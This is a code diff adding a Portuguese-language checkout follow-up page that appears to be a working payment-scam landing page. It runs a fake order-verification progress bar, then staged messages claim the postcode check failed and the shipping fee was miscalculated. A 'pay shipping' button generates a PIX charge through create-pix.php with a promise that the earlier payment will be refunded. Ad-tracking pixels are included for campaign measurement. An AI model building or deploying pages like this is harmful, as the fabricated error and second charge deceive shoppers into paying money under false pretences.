@@ -1,0 +1,468 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <style>
+   body {
+    font-size: 20px !important;
+    line-height: 1.7 !important;
+  }
+  h1, h2, h3, h4, h5, h6 {
+    font-size: 26px !important;
+    line-height: 1.4 !important;
+  }
+  p, label, input, textarea, button, a {
+    font-size: 20px !important;
+    line-height: 1.6 !important;
+  }
+  .retry-button, #btnPagarFrete, #pix-copy, #pix-next {
+    font-size: 22px !important;
+    padding: 18px 24px !important;
+  }
+  </style>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" name="viewport">
+  <title>
+   Verificação de Pedido
+  </title>
+  <!-- Fonte bonita -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <link href="css/styles.css" rel="stylesheet">
+  <!-- Meta Pixel -->
+  <script>
+   !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '1209153881085976');
+  fbq('track', 'PageView');
+  </script>
+  <noscript>
+   <img height="1" src="https://www.facebook.com/tr?id=1209153881085976&ev=PageView&noscript=1" style="display:none" width="1"/>
+  </noscript>
+  <!-- Pixel UTMify -->
+  <script>
+   window.pixelId = "69337cdb14418ec10c7be710";
+    var a = document.createElement("script");
+    a.async = true;
+    a.defer = true;
+    a.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
+    document.head.appendChild(a);
+  </script>
+  <!-- UTMs -->
+  <script async="" data-utmify-fast-start="" data-utmify-prevent-subids="" defer="" src="js/latest.js">
+  </script>
+  <!-- Estilo rápido inline para garantir funcionamento -->
+  <style>
+   body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: #f4f4f4;
+      color: #333;
+    }
+
+    .top-bar {
+      width: 100%;
+      height: 40px;
+      background: #FFD600;
+    }
+
+    .full-screen-section {
+      min-height: calc(100vh - 40px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      flex-direction: column;
+    }
+
+    .verification-content {
+  transform: scale(1.12);
+  padding: 28px 22px;
+  font-size: 17px;
+      max-width: 420px;
+      background: #fff;
+      border-radius: 16px;
+      padding: 20px 16px;
+      text-align: center;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+    }
+
+    .verification-content h1 {
+      font-size: 20px;
+      margin-bottom: 6px;
+      color: #222;
+    }
+
+    .verification-content p {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 14px;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 8px;
+      background: #eee;
+      border-radius: 999px;
+      overflow: hidden;
+    }
+
+    .progress {
+      height: 100%;
+      background: linear-gradient(90deg, #C8102E, #A0001E);
+      width: 0%;
+      transition: width 0.4s ease;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    .box-stage {
+  transform: scale(1.15);
+  padding: 24px 20px;
+  font-size: 16px;
+      max-width: 480px;
+      width: 100%;
+      background: #fff;
+      border-radius: 16px;
+      padding: 16px 14px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.06);
+      margin-bottom: 12px;
+    }
+
+    .box-stage h3 {
+  font-size: 26px;
+  line-height: 1.4;
+      margin: 0 0 8px;
+      font-size: 16px;
+      color: #222;
+    }
+
+    .box-stage p {
+  font-size: 20px;
+  line-height: 1.6;
+      margin: 0;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .retry-button, #btnPagarFrete {
+  font-size: 20px;
+  padding: 18px;
+  margin-top: 18px;
+      display: inline-block;
+      margin-top: 12px;
+      padding: 12px 16px;
+      border-radius: 999px;
+      border: none;
+      text-decoration: none;
+      text-align: center;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+      background: linear-gradient(90deg, #C8102E, #A0001E);
+      color: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      width: 100%;
+    }
+
+    #pix-overlay textarea {
+      resize: none;
+      font-family: monospace;
+    }
+  </style>
+ </head>
+ <body>
+  <div class="full-screen-section" id="verification-section">
+   <div class="verification-content">
+    <h1>
+     Seu pedido foi concluído!
+    </h1>
+    <p>
+     Aguarde enquanto realizamos a verificação do pedido...
+    </p>
+    <div class="progress-bar">
+     <div class="progress" id="progress">
+     </div>
+    </div>
+   </div>
+  </div>
+  <div class="full-screen-section hidden" id="error-section">
+   <div class="box-stage hidden" id="box-1">
+    <h3>
+     Pedido Concluído com Sucesso ✅
+    </h3>
+    <p>
+     Aguarde um momento...
+    </p>
+   </div>
+   <div class="box-stage hidden" id="box-2">
+    <h3>
+     Validação do CEP para Entrega ❌
+    </h3>
+    <p>
+     Estamos verificando as informações...
+    </p>
+   </div>
+   <div class="box-stage hidden" id="box-3">
+    <h3>
+     O valor do Frete foi calculado errado para sua região.
+    </h3>
+    <p>
+     Corrija o pagamento do frete para que seu pedido seja enviado.
+    </p>
+    <a class="retry-button" href="#" id="btnPagarFrete" style="padding:18px 28px;font-size:20px;border:none;border-radius:12px;background:#C8102E;color:white;cursor:pointer;">
+     PAGAR FRETE
+    </a>
+    <p style="font-size:12px;margin-top:10px;">
+     (O valor pago anteriormente será reembolsado)
+    </p>
+   </div>
+  </div>
+  <script src="js/qrcode.min.js">
+  </script>
+  <script>
+   // Simulação da barra de progresso e transição entre seções
+  document.addEventListener('DOMContentLoaded', () => {
+    const progressBar = document.getElementById('progress');
+    const verification = document.getElementById('verification-section');
+    const error = document.getElementById('error-section');
+    const box1 = document.getElementById('box-1');
+    const box2 = document.getElementById('box-2');
+    const box3 = document.getElementById('box-3');
+
+    let percent = 0;
+    const interval = setInterval(() => {
+      percent += 2;
+      progressBar.style.width = percent + '%';
+      if (percent >= 100) {
+        clearInterval(interval);
+        verification.classList.add('hidden');
+        error.classList.remove('hidden');
+        setTimeout(() => box1.classList.remove('hidden'), 500);
+        setTimeout(() => box2.classList.remove('hidden'), 3400);
+        setTimeout(() => box3.classList.remove('hidden'), 6400);
+      }
+    }, 100); // total 20s
+  });
+
+  async function gerarPIX(formData) {
+    const body = Object.fromEntries(formData.entries());
+    body.valor_frete = 1380;
+
+    const res = await fetch('create-pix.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+
+    const text = await res.text();
+    let data;
+    try {
+      data = JSON.parse(text);
+    } catch (e) {
+      console.error('Resposta não é JSON:', text);
+      throw new Error('Resposta inválida do servidor.');
+    }
+
+    if (!res.ok || data.sucesso === false) {
+      throw new Error(JSON.stringify(data.raw || data));
+    }
+
+    return data;
+  }
+
+  function pegarMaiorString(obj) {
+    let maior = '';
+    const visitados = new Set();
+
+    function percorre(o) {
+      if (!o || typeof o !== 'object' || visitados.has(o)) return;
+      visitados.add(o);
+      for (const chave in o) {
+        const val = o[chave];
+        if (typeof val === 'string') {
+          const s = val.trim();
+          if (s.length > maior.length) maior = s;
+        } else if (typeof val === 'object') {
+          percorre(val);
+        }
+      }
+    }
+
+    percorre(obj);
+    return maior || null;
+  }
+
+  function showPixPopup(pix) {
+    let code =
+      pix.copia_cola ||
+      pix.qr_code_base64 ||
+      (pix.raw && (pix.raw.copia_cola || pix.raw.brCode || pix.raw.pixCopiaCola)) ||
+      pegarMaiorString(pix);
+
+    if (!code) {
+      alert('PIX criado, mas não encontrei o código.');
+      return;
+    }
+
+    let overlay = document.getElementById('pix-overlay');
+    if (overlay) overlay.remove();
+
+    overlay = document.createElement('div');
+    overlay.id = 'pix-overlay';
+    overlay.style.cssText =
+      'position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:9999;';
+
+    overlay.innerHTML = `
+      <div style="background:#fff;border-radius:16px;max-width:380px;width:90%;padding:20px;box-shadow:0 8px 24px rgba(0,0,0,0.2);position:relative;text-align:center;">
+        <button id="pix-close" style="position:absolute;top:8px;right:12px;border:none;background:none;font-size:22px;cursor:pointer;">×</button>
+        <h2 style="margin:0 0 8px;font-size:20px;">Pagamento via PIX</h2>
+        <p style="font-size:13px;color:#555;margin-bottom:10px;">Escaneie ou copie o código abaixo:</p>
+        <div id="pix-qr" style="margin:10px auto;width:220px;height:220px;"></div>
+        <textarea id="pix-text" readonly style="width:100%;height:80px;margin-top:10px;padding:8px;border-radius:8px;border:1px solid #ddd;font-size:12px;"></textarea>
+        <button id="pix-copy" style="margin-top:10px;padding:10px 14px;border:none;border-radius:999px;background:#00c27a;color:#fff;font-weight:bold;font-size:14px;cursor:pointer;">Copiar código PIX</button>
+        <div id="pix-next-wrapper"></div>
+      </div>
+    `;
+    document.body.appendChild(overlay);
+
+    document.getElementById('pix-text').value = code;
+    new QRCode(document.getElementById('pix-qr'), {
+      text: code,
+      width: 220,
+      height: 220,
+      colorDark: '#000000',
+      colorLight: '#ffffff',
+      correctLevel: QRCode.CorrectLevel.M
+    });
+
+    document.getElementById('pix-close').onclick = () => overlay.remove();
+
+    document.getElementById('pix-copy').onclick = () => {
+      navigator.clipboard.writeText(code).then(() => {
+        alert("PIX copiado!");
+
+        const wrapper = document.getElementById('pix-next-wrapper');
+        if (!wrapper) return;
+
+        setTimeout(() => {
+          const btnNext = document.createElement('button');
+          btnNext.id = 'pix-next';
+          btnNext.textContent = 'Já paguei, continuar';
+          btnNext.style.marginTop = '14px';
+          btnNext.style.padding = '12px 20px';
+          btnNext.style.border = 'none';
+          btnNext.style.borderRadius = '999px';
+          btnNext.style.background = '#C8102E';
+          btnNext.style.color = '#fff';
+          btnNext.style.fontWeight = 'bold';
+          btnNext.style.fontSize = '15px';
+          btnNext.style.cursor = 'pointer';
+          btnNext.style.width = '100%';
+
+          btnNext.onclick = () => {
+            window.location.href = "/importação";
+          };
+
+          wrapper.appendChild(btnNext);
+        }, 15000);
+      });
+    };
+  }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('freteForm');
+    const btn = document.getElementById('btnPagarFrete');
+
+    if (!form || !btn) return;
+
+    btn.addEventListener('click', async () => {
+      const requiredFields = form.querySelectorAll('input[required]');
+      for (let field of requiredFields) {
+        if (!field.value.trim()) {
+          alert('Preencha todos os campos obrigatórios antes de continuar.');
+          field.focus();
+          return;
+        }
+      }
+
+      btn.disabled = true;
+      btn.textContent = 'Gerando PIX...';
+
+      const formData = new FormData(form);
+
+      try {
+        const pix = await gerarPIX(formData);
+        console.log('Resposta PIX (frete):', pix);
+        showPixPopup(pix);
+        btn.textContent = 'PAGAR FRETE';
+      } catch (err) {
+        console.error(err);
+        alert('Erro ao gerar PIX: ' + err.message);
+        btn.textContent = 'PAGAR FRETE';
+      } finally {
+        btn.disabled = false;
+      }
+    });
+  });
+  </script>
+  <script src="js/qrcode.min.js">
+  </script>
+  <script>
+   document.addEventListener('DOMContentLoaded', () => {
+  const btn = document.getElementById('btnPagarFrete');
+  if (!btn) return;
+
+  btn.addEventListener('click', async () => {
+    btn.disabled = true;
+    btn.textContent = 'Gerando PIX...';
+
+    try {
+      const formData = new FormData();
+      formData.append("nome", "teste");
+      formData.append("email", "teste@email.com");
+      formData.append("cpf", "000.000.000-00");
+      formData.append("telefone", "11999999999");
+      formData.append("cep", "00000-000");
+
+      const response = await fetch('create-pix.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(Object.fromEntries(formData.entries()))
+      });
+
+      const text = await response.text();
+      let data;
+      try {
+        data = JSON.parse(text);
+      } catch (e) {
+        alert("Erro: resposta não é JSON válida");
+        console.log("Erro de JSON:", text);
+        return;
+      }
+
+      if (!response.ok || data.sucesso === false) {
+        alert("Erro ao gerar PIX.");
+        console.log("Erro no retorno da API:", data);
+        return;
+      }
+
+      showPixPopup(data);
+      btn.textContent = 'PAGAR FRETE';
+    } catch (err) {
+      console.error(err);
+      alert('Erro ao gerar PIX: ' + err.message);
+      btn.textContent = 'PAGAR FRETE';
+    } finally {
+      btn.disabled = false;
+    }
+  });
+});
+  </script>
+ 
+
+</body></html>
